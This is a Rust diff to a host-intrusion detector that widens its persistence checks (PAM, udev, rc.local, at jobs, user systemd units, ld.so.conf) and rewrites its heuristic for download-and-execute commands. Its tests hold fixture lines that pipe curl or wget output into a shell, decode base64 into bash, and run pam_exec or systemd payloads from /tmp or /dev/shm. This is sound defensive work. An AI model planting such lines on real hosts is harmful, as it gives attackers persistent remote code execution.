@@ -5,7 +5,7 @@
 //! emit INFO for interactive edits or HIGH/CRITICAL for unattended ones.
 
 use crate::alert::Finding;
-use crate::detect::{writer_label, Ctx};
+use crate::detect::{content_tag, writer_label, Ctx};
 use crate::events::{
     is_container_overlay_path, is_editor_artifact, DetectionId, FileEvent, FileKind, Severity,
 };
@@ -30,7 +30,161 @@ pub fn evaluate(ev: &FileEvent, ctx: &Ctx) -> Vec<Finding> {
     findings.extend(cron_paths(ev, ctx));
     findings.extend(shell_profiles(ev, ctx));
     findings.extend(systemd_units(ev, ctx));
+    findings.extend(other_surfaces(ev, ctx));
     findings
+}
+
+/// Persistence and login surfaces beyond cron, profiles and units.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum Surface {
+    Pam,
+    Environment,
+    RcLocal,
+    Udev,
+    Modules,
+}
+
+fn surface_of(path: &str) -> Option<Surface> {
+    let under = |dir: &str| {
+        path.strip_prefix(dir)
+            .and_then(|r| r.strip_prefix('/'))
+            .is_some_and(|r| !r.is_empty() && !r.contains('/'))
+    };
+    if under("/etc/pam.d") {
+        Some(Surface::Pam)
+    } else if path == "/etc/environment" || path == "/etc/security/pam_env.conf" {
+        Some(Surface::Environment)
+    } else if path == "/etc/rc.local" {
+        Some(Surface::RcLocal)
+    } else if under("/etc/udev/rules.d") && path.ends_with(".rules") {
+        Some(Surface::Udev)
+    } else if path == "/etc/modules" || (under("/etc/modules-load.d") && path.ends_with(".conf")) {
+        Some(Surface::Modules)
+    } else {
+        None
+    }
+}
+
+/// Content that makes a change on this surface clearly dangerous.
+fn surface_red_flag(surface: Surface, content: &str) -> Option<String> {
+    let lines = content
+        .lines()
+        .map(str::trim)
+        .filter(|l| !l.is_empty() && !l.starts_with('#'));
+    let mut hits: Vec<&str> = Vec::new();
+    for l in lines {
+        let hit = match surface {
+            // A preload for every login session.
+            Surface::Environment => l.contains("LD_PRELOAD") || l.contains("LD_AUDIT"),
+            // pam_exec runs a program on every login; a module given by a
+            // path outside the system library dirs is someone's own code.
+            Surface::Pam => {
+                l.contains("pam_exec")
+                    || l.split_whitespace().any(|w| {
+                        w.starts_with('/')
+                            && w.ends_with(".so")
+                            && !w.starts_with("/lib")
+                            && !w.starts_with("/usr/lib")
+                    })
+            }
+            // RUN+= executes a program whenever the device event fires.
+            Surface::Udev => l.contains("RUN+=") || l.contains("RUN="),
+            Surface::RcLocal => looks_like_staging(l),
+            Surface::Modules => false,
+        };
+        if hit {
+            hits.push(l);
+        }
+    }
+    (!hits.is_empty()).then(|| {
+        hits.into_iter()
+            .take(MAX_SHOWN_COMMANDS)
+            .collect::<Vec<_>>()
+            .join(" | ")
+    })
+}
+
+fn other_surfaces(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
+    let surface = surface_of(&ev.path)?;
+    let content = ev.content.as_deref().unwrap_or("");
+    let red_flag = surface_red_flag(surface, content);
+    if red_flag.is_none() && writer_is_installer(ev, ctx) {
+        return None;
+    }
+    let attribution = ctx.attribute(ev);
+    let (what_is, why) = match surface {
+        Surface::Pam => (
+            "PAM configuration",
+            "PAM decides who can log in and runs on every authentication. A changed stack can \
+             accept any password, log credentials, or run a program at each login.",
+        ),
+        Surface::Environment => (
+            "the global login environment",
+            "Variables set here apply to every login session. LD_PRELOAD or LD_AUDIT in it loads \
+             a library into everything users start.",
+        ),
+        Surface::RcLocal => (
+            "rc.local",
+            "rc.local runs as root at every boot. It's an old but still common place to persist.",
+        ),
+        Surface::Udev => (
+            "a udev rule",
+            "udev rules can run programs as root when a device event fires (RUN+=), including \
+             at every boot.",
+        ),
+        Surface::Modules => (
+            "the kernel modules loaded at boot",
+            "A module listed here is loaded into the kernel at every boot. Rootkits persist \
+             this way.",
+        ),
+    };
+    let severity = match (&red_flag, attribution.is_interactive()) {
+        (Some(_), false) => Severity::Critical,
+        (Some(_), true) => Severity::High,
+        (None, false) => Severity::High,
+        (None, true) => Severity::Info,
+    };
+    let title = match (severity, surface) {
+        (Severity::Info, _) => format!("Change to {} during a session", what_is),
+        (_, Surface::Pam) if red_flag.is_some() => {
+            "PAM now runs a program or a non-system module".to_string()
+        }
+        (_, Surface::Environment) if red_flag.is_some() => {
+            "Global environment sets LD_PRELOAD".to_string()
+        }
+        (_, Surface::Udev) if red_flag.is_some() => "udev rule runs a program".to_string(),
+        _ => format!("Change to {} with no session present", what_is),
+    };
+    let mut f = Finding::new(
+        DetectionId::D3,
+        severity,
+        &title,
+        &format!("d3|surface|{}|{}", ev.path, content_tag(content)),
+    )
+    .what(format!(
+        "{} was {} by {}{}.",
+        ev.path,
+        ev.kind.as_str(),
+        writer_label(ev.writer.as_ref()),
+        if attribution.is_interactive() {
+            ""
+        } else {
+            " while no interactive session was active on the host"
+        }
+    ))
+    .fact("Path", &ev.path)
+    .why(why);
+    if let Some(lines) = red_flag {
+        f = f.fact("Lines", lines);
+    }
+    if severity >= Severity::High {
+        f = f.actions([
+            "Review the file against its package default or your last known version.",
+            "Revert anything you didn't change.",
+            "Identify the process that wrote the file.",
+        ]);
+    }
+    Some(f)
 }
 
 /// Writer belongs to a package/config manager - those legitimately touch every
@@ -71,7 +225,7 @@ fn ld_preload(ev: &FileEvent, _ctx: &Ctx) -> Option<Finding> {
         DetectionId::D3,
         Severity::Critical,
         "ld.so.preload modified",
-        "d3|ld-preload",
+        &format!("d3|ld-preload|{}", content_tag(&libs.join("\n"))),
     )
     .what(format!(
         "/etc/ld.so.preload was {} by {}. Every new process on this host will now load the \
@@ -86,7 +240,7 @@ fn ld_preload(ev: &FileEvent, _ctx: &Ctx) -> Option<Finding> {
     )
     .actions([
         "Inspect the file now and remove any library you did not install.",
-        "Treat the host as compromised; the listed libraries can hide processes, files and sockets.",
+        "Treat the host as potentially compromised; the listed libraries can hide processes, files and sockets.",
         "Reboot into a known-good state once the entry is removed.",
     ]);
     if !libs.is_empty() {
@@ -105,14 +259,7 @@ fn ld_conf(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
         .unwrap_or("")
         .lines()
         .map(str::trim)
-        .filter(|l| {
-            !l.is_empty()
-                && !l.starts_with('#')
-                && !l.starts_with("/usr/")
-                && !l.starts_with("/lib")
-                && !l.starts_with("/opt/")
-                && !l.starts_with("include ")
-        })
+        .filter(|l| !l.is_empty() && !l.starts_with('#') && !is_standard_ld_line(l))
         .map(str::to_string)
         .collect();
 
@@ -169,6 +316,38 @@ fn ld_conf(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
     Some(f)
 }
 
+/// A loader config line that only names standard library directories.
+///
+/// Prefix checks let `/libevil`, `/usr/../tmp` and `include /tmp/x.conf`
+/// through. Now a path has to be one of the standard directories or under
+/// one, written plainly, and an include must point back into ld.so.conf.d.
+fn is_standard_ld_line(line: &str) -> bool {
+    const DIRS: &[&str] = &["/usr", "/lib", "/lib32", "/lib64", "/libx32", "/opt"];
+    let plain = |p: &str| {
+        p.starts_with('/')
+            && !p.contains("/../")
+            && !p.contains("/./")
+            && !p.contains("//")
+            && !p.ends_with("/..")
+    };
+    if let Some(target) = line.strip_prefix("include") {
+        let target = target.trim();
+        return plain(target) && target.starts_with("/etc/ld.so.conf.d/");
+    }
+    // A line may hold several paths separated by spaces, commas or colons.
+    let mut paths = line
+        .split(|c: char| c.is_whitespace() || c == ',' || c == ':')
+        .filter(|p| !p.is_empty())
+        .peekable();
+    paths.peek().is_some()
+        && paths.all(|p| {
+            plain(p)
+                && DIRS
+                    .iter()
+                    .any(|d| p == *d || p.strip_prefix(d).is_some_and(|r| r.starts_with('/')))
+        })
+}
+
 fn authorized_keys(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
     let name = ev.path.rsplit('/').next().unwrap_or("");
     if name != "authorized_keys" && name != "authorized_keys2" {
@@ -214,7 +393,11 @@ fn authorized_keys(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
         DetectionId::D3,
         Severity::High,
         "SSH key added with no session present",
-        &format!("d3|authorized-keys|{}", ev.path),
+        &format!(
+            "d3|authorized-keys|{}|{}",
+            ev.path,
+            content_tag(ev.content.as_deref().unwrap_or(""))
+        ),
     )
     .what(format!(
         "{} was {} by {} while no interactive session was active on the host.",
@@ -249,7 +432,15 @@ const CRON_PATHS: &[&str] = &[
     "/var/spool/cron/crontabs",
     "/etc/anacrontab",
     "/var/spool/anacron",
+    // at jobs: Debian keeps them under the cron spool, RHEL in /var/spool/at.
+    "/var/spool/at",
 ];
+
+fn is_at_job(path: &str) -> bool {
+    let name = path.rsplit('/').next().unwrap_or("");
+    (path.starts_with("/var/spool/cron/atjobs/") || path.starts_with("/var/spool/at/"))
+        && !name.starts_with('.')
+}
 
 fn cron_paths(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
     let is_cron = CRON_PATHS
@@ -258,25 +449,57 @@ fn cron_paths(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
     if !is_cron {
         return None;
     }
-    // `crontab -e` writes via the crontab binary; anacron updates its own timestamps.
-    if let Some(w) = &ev.writer {
-        if (is_system_tool(&w.comm, &w.exe, &["crontab", "anacron"])
-            || is_user_mgmt_tool(&w.comm, &w.exe))
-            && ctx.tool_exemption_applies(w.pid)
-        {
-            return None;
-        }
-    }
     if ev.path.starts_with("/var/spool/anacron/") {
         return None;
     }
-    if writer_is_installer(ev, ctx) {
+    let at_job = is_at_job(&ev.path);
+    // at's own bookkeeping (.SEQ, spool dirs) isn't a job.
+    if !at_job
+        && (ev.path.starts_with("/var/spool/cron/atjobs") || ev.path.starts_with("/var/spool/at"))
+    {
         return None;
     }
-    let attribution = ctx.attribute(ev);
     let system_table = ev.path == "/etc/crontab" || ev.path.starts_with("/etc/cron.d/");
-    let commands = cron_commands(ev.content.as_deref().unwrap_or(""), system_table);
-    let suspicious_cmd = commands.iter().any(|c| looks_like_staging(c));
+    let content = ev.content.as_deref().unwrap_or("");
+    // An at job is a shell script, not a table: every line is a command.
+    let all_commands: Vec<String> = if at_job {
+        content
+            .lines()
+            .map(str::trim)
+            .filter(|l| !l.is_empty() && !l.starts_with('#'))
+            .map(str::to_string)
+            .collect()
+    } else {
+        cron_commands(content, system_table)
+    };
+    let suspicious_cmd = all_commands.iter().any(|c| looks_like_staging(c));
+    // Content first: the real `crontab` installs whatever it's fed, so
+    // `(crontab -l; echo '* * * * * curl ...|sh') | crontab -` used to pass
+    // as an ordinary crontab edit. The exemptions only cover clean tables.
+    if !suspicious_cmd {
+        // `crontab -e` writes via the crontab binary; anacron updates its own timestamps.
+        if let Some(w) = &ev.writer {
+            if (is_system_tool(&w.comm, &w.exe, &["crontab", "anacron", "at", "batch"])
+                || is_user_mgmt_tool(&w.comm, &w.exe))
+                && ctx.tool_exemption_applies(w.pid)
+            {
+                return None;
+            }
+        }
+        if writer_is_installer(ev, ctx) {
+            return None;
+        }
+    }
+    let attribution = ctx.attribute(ev);
+    // Show the staging lines first, and only a few lines in all.
+    let mut commands: Vec<String> = all_commands
+        .iter()
+        .filter(|c| looks_like_staging(c))
+        .chain(all_commands.iter().filter(|c| !looks_like_staging(c)))
+        .take(MAX_SHOWN_COMMANDS)
+        .cloned()
+        .collect();
+    commands.dedup();
 
     if attribution.is_interactive() && !suspicious_cmd {
         return Some(
@@ -308,7 +531,11 @@ fn cron_paths(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
         } else {
             "Cron persistence with no session present"
         },
-        &format!("d3|cron|{}", ev.path),
+        &format!(
+            "d3|cron|{}|{}",
+            ev.path,
+            content_tag(&all_commands.join("\n"))
+        ),
     )
     .what(format!(
         "{} was {} by {}{}.",
@@ -369,23 +596,102 @@ fn cron_commands(content: &str, system_table: bool) -> Vec<String> {
             Some(rest[skip..].join(" "))
         })
         .filter(|c| !c.is_empty())
-        .take(4)
         .collect()
 }
 
+/// Cron commands quoted in an alert. Every line is checked; only the
+/// display is capped (a fifth malicious line used to go unchecked).
+const MAX_SHOWN_COMMANDS: usize = 4;
+
+/// Split a command line into words, with `|` as a word of its own. Quotes,
+/// `;`, `&`, parentheses, backticks and redirections only separate words.
+/// Good enough to find "which programs run here", not a shell parser.
+fn shell_words(cmd: &str) -> Vec<String> {
+    let mut out = Vec::new();
+    let mut cur = String::new();
+    for c in cmd.chars() {
+        if c == '|' {
+            if !cur.is_empty() {
+                out.push(std::mem::take(&mut cur));
+            }
+            out.push("|".to_string());
+        } else if c.is_whitespace()
+            || matches!(
+                c,
+                ';' | '&' | '(' | ')' | '`' | '\'' | '"' | '<' | '>' | '$' | '{' | '}'
+            )
+        {
+            if !cur.is_empty() {
+                out.push(std::mem::take(&mut cur));
+            }
+        } else {
+            cur.push(c);
+        }
+    }
+    if !cur.is_empty() {
+        out.push(cur);
+    }
+    out
+}
+
+/// The program name of a word: `/usr/bin/python3.11` -> `python3.11`.
+fn prog(word: &str) -> &str {
+    word.rsplit('/').next().unwrap_or(word)
+}
+
+fn is_shell_or_interpreter(word: &str) -> bool {
+    let p = prog(word);
+    let stem = p.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.');
+    matches!(
+        stem,
+        "sh" | "bash"
+            | "dash"
+            | "zsh"
+            | "ksh"
+            | "ash"
+            | "busybox"
+            | "python"
+            | "perl"
+            | "ruby"
+            | "php"
+            | "node"
+    )
+}
+
+fn is_transient_path(word: &str) -> bool {
+    ["/tmp/", "/dev/shm/", "/var/tmp/"]
+        .iter()
+        .any(|d| word.starts_with(d))
+}
+
 /// Heuristic for "download and execute" one-liners.
+///
+/// Word-based: substring checks matched `ssh ` and `flush ` as a shell and
+/// made e.g. `rsync -e ssh ... /tmp/` CRITICAL (which can auto-isolate).
 fn looks_like_staging(cmd: &str) -> bool {
-    let lower = cmd.to_lowercase();
-    let fetches = lower.contains("curl ") || lower.contains("wget ") || lower.contains("fetch ");
-    let executes = lower.contains("| sh")
-        || lower.contains("|sh")
-        || lower.contains("| bash")
-        || lower.contains("|bash")
-        || lower.contains("| python")
-        || lower.contains("| perl");
-    let from_transient =
-        lower.contains("/tmp/") || lower.contains("/dev/shm/") || lower.contains("/var/tmp/");
-    (fetches && executes) || (from_transient && (lower.contains("sh ") || lower.contains("bash ")))
+    let words = shell_words(&cmd.to_lowercase());
+    let fetches = words
+        .iter()
+        .any(|w| matches!(prog(w), "curl" | "wget" | "wget2" | "fetch" | "aria2c"));
+    let decodes = words.iter().any(|w| prog(w) == "base64");
+    // Something piped straight into a shell or interpreter.
+    let pipes_into_shell = words
+        .windows(2)
+        .any(|w| w[0] == "|" && is_shell_or_interpreter(&w[1]));
+    // A shell/interpreter running a script from a transient dir, or a program
+    // started straight from one.
+    let runs_transient = words.first().is_some_and(|w| is_transient_path(w))
+        || words
+            .windows(2)
+            .any(|w| w[0] == "|" && is_transient_path(&w[1]))
+        || words.iter().enumerate().any(|(i, w)| {
+            is_shell_or_interpreter(w)
+                && words[i + 1..]
+                    .iter()
+                    .find(|a| !a.starts_with('-'))
+                    .is_some_and(|a| is_transient_path(a))
+        });
+    (pipes_into_shell && (fetches || decodes)) || runs_transient
 }
 
 fn shell_profiles(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
@@ -451,11 +757,26 @@ fn shell_profiles(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
     )
 }
 
-fn systemd_units(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
-    let in_etc = ev.path.starts_with("/etc/systemd/system/");
-    if !in_etc {
-        return None;
+/// Directories systemd loads units from that we watch: the admin dir, the
+/// vendor dirs (packages only, normally), and per-user unit dirs.
+fn systemd_unit_rest(path: &str) -> Option<&str> {
+    for base in [
+        "/etc/systemd/system/",
+        "/usr/lib/systemd/system/",
+        "/lib/systemd/system/",
+    ] {
+        if let Some(r) = path.strip_prefix(base) {
+            return Some(r);
+        }
     }
+    // ~/.config/systemd/user/ (root's or a user's): started at login.
+    path.split_once("/.config/systemd/user/")
+        .filter(|(home, _)| home == &"/root" || home.starts_with("/home/"))
+        .map(|(_, r)| r)
+}
+
+fn systemd_units(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
+    systemd_unit_rest(&ev.path)?;
     let is_unit = [
         ".service",
         ".timer",
@@ -474,7 +795,22 @@ fn systemd_units(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
     if !is_unit && !is_enable_link && !is_dropin {
         return None;
     }
-    if ev.managed_by_package == Some(true) || writer_is_installer(ev, ctx) {
+    if ev.managed_by_package == Some(true) {
+        return None;
+    }
+    let execs = unit_exec_lines(ev.content.as_deref().unwrap_or(""));
+    // The program itself in a transient dir, or a staging one-liner. Any
+    // mention of /tmp used to count, so `--socket /tmp/app.sock` was CRITICAL.
+    // Show the suspicious command if there is one, else the first.
+    let exec_line = execs
+        .iter()
+        .find(|e| looks_like_staging(e))
+        .or(execs.first())
+        .cloned();
+    let suspicious_exec = execs.iter().any(|e| looks_like_staging(e));
+    // An installer writing a unit that runs from /tmp or pipes curl into a
+    // shell isn't a normal install; only clean units get the exemption.
+    if !suspicious_exec && writer_is_installer(ev, ctx) {
         return None;
     }
     // `systemctl enable` is performed by systemd itself (PID 1) creating the symlink.
@@ -486,20 +822,6 @@ fn systemd_units(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
         }
     }
     let attribution = ctx.attribute(ev);
-    let execs = unit_exec_lines(ev.content.as_deref().unwrap_or(""));
-    let is_suspicious = |e: &str| {
-        e.contains("/tmp/")
-            || e.contains("/dev/shm/")
-            || e.contains("/var/tmp/")
-            || looks_like_staging(e)
-    };
-    // Show the suspicious command if there is one, else the first.
-    let exec_line = execs
-        .iter()
-        .find(|e| is_suspicious(e))
-        .or(execs.first())
-        .cloned();
-    let suspicious_exec = execs.iter().any(|e| is_suspicious(e));
 
     if attribution.is_interactive() && !suspicious_exec {
         return Some(
@@ -537,7 +859,7 @@ fn systemd_units(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
         } else {
             "systemd unit installed with no session present"
         },
-        &format!("d3|systemd|{}", ev.path),
+        &format!("d3|systemd|{}|{}", ev.path, content_tag(&execs.join("\n"))),
     )
     .what(format!(
         "{} was {} by {} and does not belong to any installed package.",
@@ -561,9 +883,9 @@ fn systemd_units(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
     Some(f)
 }
 
-/// `/etc/systemd/system/<unit>.d/<name>.conf`
+/// `<unit dir>/<unit>.d/<name>.conf`
 pub fn is_systemd_dropin(path: &str) -> bool {
-    let Some(rest) = path.strip_prefix("/etc/systemd/system/") else {
+    let Some(rest) = systemd_unit_rest(path) else {
         return false;
     };
     match rest.split_once('/') {
@@ -577,19 +899,27 @@ pub fn is_systemd_dropin(path: &str) -> bool {
 /// prefixes (`-`, `@`, `+`, `!`, `:`) are stripped.
 fn unit_exec_lines(content: &str) -> Vec<String> {
     const KEYS: &[&str] = &[
-        "ExecStart=",
-        "ExecStartPre=",
-        "ExecStartPost=",
-        "ExecStop=",
-        "ExecStopPost=",
-        "ExecReload=",
-        "ExecCondition=",
+        "ExecStart",
+        "ExecStartPre",
+        "ExecStartPost",
+        "ExecStop",
+        "ExecStopPost",
+        "ExecReload",
+        "ExecCondition",
     ];
+    // systemd allows spaces around '=' (`ExecStart = /tmp/x`).
     content
         .lines()
         .map(str::trim)
-        .filter_map(|l| KEYS.iter().find_map(|k| l.strip_prefix(k)))
-        .map(|v| v.trim_start_matches(['-', '@', '+', '!', ':']).trim())
+        .filter_map(|l| {
+            let (k, v) = l.split_once('=')?;
+            KEYS.contains(&k.trim()).then_some(v)
+        })
+        .map(|v| {
+            v.trim()
+                .trim_start_matches(['-', '@', '+', '!', ':'])
+                .trim()
+        })
         .filter(|v| !v.is_empty())
         .map(str::to_string)
         .collect()
@@ -638,13 +968,242 @@ mod tests {
         assert!(unit_exec_lines("[Service]\nRestart=always\n").is_empty());
     }
 
+    mod engine_level {
+        use crate::alert::Alert;
+        use crate::baseline::Baseline;
+        use crate::config::Config;
+        use crate::engine::Engine;
+        use crate::events::*;
+        use chrono::{DateTime, Utc};
+
+        fn engine() -> Engine {
+            let cfg = Config::default();
+            let allow = cfg.allowlist.clone();
+            Engine::new(cfg, allow, Baseline::new(false, 24, Utc::now()), "t".into())
+        }
+
+        fn exec(t: DateTime<Utc>, pid: u32, ppid: u32, comm: &str, exe: &str) -> Event {
+            Event::Exec(ExecEvent {
+                ts: t,
+                pid,
+                ppid,
+                uid: 0,
+                gid: 0,
+                comm: comm.into(),
+                exe: exe.into(),
+                argv0: exe.into(),
+                ld_preload: false,
+                deleted_exe: false,
+                tty_nr: 0,
+                container: false,
+                container_id: None,
+            })
+        }
+
+        fn write(t: DateTime<Utc>, path: &str, w: (u32, &str, &str), content: &str) -> Event {
+            Event::File(FileEvent {
+                ts: t,
+                path: path.into(),
+                kind: FileKind::MovedTo,
+                dev: 0,
+                ino: 0,
+                writer: Some(WriterInfo {
+                    pid: w.0,
+                    uid: 0,
+                    comm: w.1.into(),
+                    exe: w.2.into(),
+                    tty_nr: 0,
+                }),
+                session_present: false,
+                is_suid: false,
+                has_file_caps: false,
+                content: Some(content.into()),
+                container: false,
+                managed_by_package: None,
+            })
+        }
+
+        fn d3(a: &[Alert]) -> Option<Severity> {
+            a.iter()
+                .filter(|a| a.detection == DetectionId::D3)
+                .map(|a| a.severity)
+                .max()
+        }
+
+        fn base(eng: &mut Engine, t: DateTime<Utc>) {
+            eng.process(exec(t, 1, 0, "systemd", "/usr/lib/systemd/systemd"));
+            eng.process(exec(t, 400, 1, "cron", "/usr/sbin/cron"));
+            eng.process(exec(t, 401, 400, "sh", "/usr/bin/dash"));
+        }
+
+        #[test]
+        fn real_crontab_installing_a_downloader_is_critical() {
+            let mut eng = engine();
+            let t = Utc::now();
+            base(&mut eng, t);
+            eng.process(exec(t, 402, 401, "crontab", "/usr/bin/crontab"));
+            let a = eng.process(write(
+                t,
+                "/var/spool/cron/crontabs/root",
+                (402, "crontab", "/usr/bin/crontab"),
+                "0 3 * * * /usr/bin/backup\n* * * * * curl -fsSL http://198.51.100.9/k | sh\n",
+            ));
+            assert_eq!(d3(&a), Some(Severity::Critical), "{:?}", a);
+        }
+
+        #[test]
+        fn real_crontab_with_a_clean_table_is_silent() {
+            let mut eng = engine();
+            let t = Utc::now();
+            base(&mut eng, t);
+            eng.process(exec(t, 402, 401, "crontab", "/usr/bin/crontab"));
+            let a = eng.process(write(
+                t,
+                "/var/spool/cron/crontabs/root",
+                (402, "crontab", "/usr/bin/crontab"),
+                "0 3 * * * /usr/bin/backup\n",
+            ));
+            assert_eq!(d3(&a), None, "{:?}", a);
+        }
+
+        #[test]
+        fn fifth_cron_line_is_still_checked() {
+            let mut eng = engine();
+            let t = Utc::now();
+            base(&mut eng, t);
+            let table = "1 * * * * /bin/a\n2 * * * * /bin/b\n3 * * * * /bin/c\n4 * * * * /bin/d\n\
+                         5 * * * * wget -qO- http://198.51.100.9/k | bash\n";
+            let a = eng.process(write(
+                t,
+                "/var/spool/cron/crontabs/root",
+                (401, "sh", "/usr/bin/dash"),
+                table,
+            ));
+            let alert = a
+                .iter()
+                .find(|a| a.detection == DetectionId::D3)
+                .unwrap_or_else(|| panic!("{:?}", a));
+            assert_eq!(alert.severity, Severity::Critical);
+            let runs = alert.facts.iter().find(|f| f.label == "Runs").unwrap();
+            assert!(runs.value.starts_with("wget"), "{}", runs.value);
+        }
+
+        #[test]
+        fn new_surfaces_are_watched() {
+            let mut eng = engine();
+            let t = Utc::now();
+            base(&mut eng, t);
+            let w = (401, "sh", "/usr/bin/dash");
+            let pam = eng.process(write(
+                t,
+                "/etc/pam.d/sshd",
+                w,
+                "auth optional pam_exec.so /tmp/.k\n@include common-auth\n",
+            ));
+            assert_eq!(d3(&pam), Some(Severity::Critical), "{:?}", pam);
+            let env = eng.process(write(t, "/etc/environment", w, "LD_PRELOAD=/lib/x.so\n"));
+            assert_eq!(d3(&env), Some(Severity::Critical), "{:?}", env);
+            let udev = eng.process(write(
+                t,
+                "/etc/udev/rules.d/99-x.rules",
+                w,
+                "ACTION==\"add\", RUN+=\"/usr/local/bin/x\"\n",
+            ));
+            assert_eq!(d3(&udev), Some(Severity::Critical), "{:?}", udev);
+            let rc = eng.process(write(t, "/etc/rc.local", w, "#!/bin/sh\nexit 0\n"));
+            assert_eq!(d3(&rc), Some(Severity::High), "{:?}", rc);
+            let user_unit = eng.process(write(
+                t,
+                "/home/dev/.config/systemd/user/x.service",
+                w,
+                "[Service]\nExecStart=/dev/shm/x\n",
+            ));
+            assert_eq!(d3(&user_unit), Some(Severity::Critical), "{:?}", user_unit);
+            let vendor = eng.process(write(
+                t,
+                "/usr/lib/systemd/system/y.service",
+                w,
+                "[Service]\nExecStart=/usr/bin/y\n",
+            ));
+            assert_eq!(d3(&vendor), Some(Severity::High), "{:?}", vendor);
+            let at = eng.process(write(
+                t,
+                "/var/spool/cron/atjobs/a00001",
+                w,
+                "#!/bin/sh\ncd /root\ncurl -s http://198.51.100.9/x | sh\n",
+            ));
+            assert_eq!(d3(&at), Some(Severity::Critical), "{:?}", at);
+        }
+
+        #[test]
+        fn installer_writing_a_tmp_unit_is_critical() {
+            let mut eng = engine();
+            let t = Utc::now();
+            eng.process(exec(t, 1, 0, "systemd", "/usr/lib/systemd/systemd"));
+            eng.process(exec(t, 500, 1, "dpkg", "/usr/bin/dpkg"));
+            let a = eng.process(write(
+                t,
+                "/etc/systemd/system/x.service",
+                (500, "dpkg", "/usr/bin/dpkg"),
+                "[Service]\nExecStart=/dev/shm/.x\n",
+            ));
+            assert_eq!(d3(&a), Some(Severity::Critical), "{:?}", a);
+            let clean = eng.process(write(
+                t,
+                "/etc/systemd/system/y.service",
+                (500, "dpkg", "/usr/bin/dpkg"),
+                "[Service]\nExecStart=/usr/bin/y\n",
+            ));
+            assert_eq!(d3(&clean), None, "{:?}", clean);
+        }
+    }
+
     #[test]
     fn staging_heuristic() {
         assert!(looks_like_staging("curl -s http://198.51.100.1/x | sh"));
+        assert!(looks_like_staging("curl -s http://198.51.100.1/x|bash"));
+        assert!(looks_like_staging("wget -qO- http://x/y | /bin/sh -s"));
+        assert!(looks_like_staging("echo aGk= | base64 -d | bash"));
         assert!(looks_like_staging("bash /tmp/.payload"));
+        assert!(looks_like_staging("/bin/sh -c '/dev/shm/.x'"));
+        assert!(looks_like_staging("python3 /var/tmp/.k.py"));
+        assert!(looks_like_staging("/tmp/.a"));
         assert!(!looks_like_staging("/usr/bin/certbot renew"));
         assert!(!looks_like_staging(
             "curl -fsS https://healthcheck.example/ping"
         ));
+        // "ssh " and "flush " aren't shells.
+        assert!(!looks_like_staging(
+            "rsync -a -e ssh /srv/data/ backup:/tmp/x"
+        ));
+        assert!(!looks_like_staging("/usr/sbin/ip route flush cache /tmp/x"));
+        // A transient path as an option value isn't the program.
+        assert!(!looks_like_staging("/usr/bin/app --socket /tmp/app.sock"));
+        assert!(!looks_like_staging(
+            "python3 /usr/bin/app --log /tmp/app.log"
+        ));
+    }
+
+    #[test]
+    fn ld_conf_lines() {
+        assert!(is_standard_ld_line("/usr/local/lib"));
+        assert!(is_standard_ld_line("/usr/lib/x86_64-linux-gnu/libfakeroot"));
+        assert!(is_standard_ld_line("/lib/x86_64-linux-gnu"));
+        assert!(is_standard_ld_line("/opt/vendor/lib"));
+        assert!(is_standard_ld_line("include /etc/ld.so.conf.d/*.conf"));
+        assert!(!is_standard_ld_line("/libevil"));
+        assert!(!is_standard_ld_line("/usr/../tmp"));
+        assert!(!is_standard_ld_line("/usr/lib/.."));
+        assert!(!is_standard_ld_line("include /tmp/x.conf"));
+        assert!(!is_standard_ld_line("/usr/lib /dev/shm"));
+        assert!(!is_standard_ld_line("/home/eve/lib"));
+    }
+
+    #[test]
+    fn unit_exec_allows_spaces_around_equals() {
+        assert_eq!(
+            unit_exec_lines("[Service]\nExecStart = /tmp/x --y\n"),
+            vec!["/tmp/x --y"]
+        );
     }
 }
